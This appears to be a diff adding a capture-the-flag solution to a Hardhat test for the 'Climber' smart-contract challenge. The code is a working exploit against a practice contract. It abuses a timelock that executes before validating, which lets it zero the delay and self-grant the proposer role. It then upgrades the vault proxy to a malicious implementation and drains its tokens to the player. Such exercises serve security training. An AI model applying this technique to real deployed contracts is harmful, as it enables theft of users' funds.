@@ -58,6 +58,39 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const climberAttacker = await (await ethers.getContractFactory('ClimberAttacker', player)).deploy(timelock.address, token.address);
+
+        const timelockInterface = (await ethers.getContractFactory('ClimberTimelock')).interface;
+        const climberAttackerInterface = (await ethers.getContractFactory('ClimberAttacker')).interface;
+        const vaultInterface = (await ethers.getContractFactory('ClimberVault')).interface;
+
+        const maliciousClimberVault = await (await ethers.getContractFactory('MaliciousClimberVault', player)).deploy();
+        await maliciousClimberVault.connect(player).initialize(climberAttacker.address, climberAttacker.address, climberAttacker.address);
+
+        // Update delay to 0 seconds
+        const calldata1 = timelockInterface.encodeFunctionData("updateDelay", [0]);
+
+        // Grant proposer role to the attacker
+        const calldata2 = timelockInterface.encodeFunctionData("grantRole", ["0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1", climberAttacker.address]);
+
+        // Callback to schedule everything
+        const calldata3 = climberAttackerInterface.encodeFunctionData("callback", []);
+
+        // Upgrade contract
+        const calldata4 = vaultInterface.encodeFunctionData("upgradeTo", [maliciousClimberVault.address]);
+
+        // Sweep everything
+        const calldata5 = vaultInterface.encodeFunctionData("sweepFunds", [token.address]);
+
+        // transfer tokens to player
+        const calldata6 = climberAttackerInterface.encodeFunctionData("transferTokens", [player.address]);
+
+        const targets = [timelock.address, timelock.address, climberAttacker.address, vault.address, vault.address, climberAttacker.address];
+        const values = [0, 0, 0, 0, 0, 0];
+        const calldata = [calldata1, calldata2, calldata3, calldata4, calldata5, calldata6];
+        const salt = ethers.utils.keccak256("0x03");
+
+        await climberAttacker.connect(player).attack(targets, values, calldata, salt);
     });
 
     after(async function () {
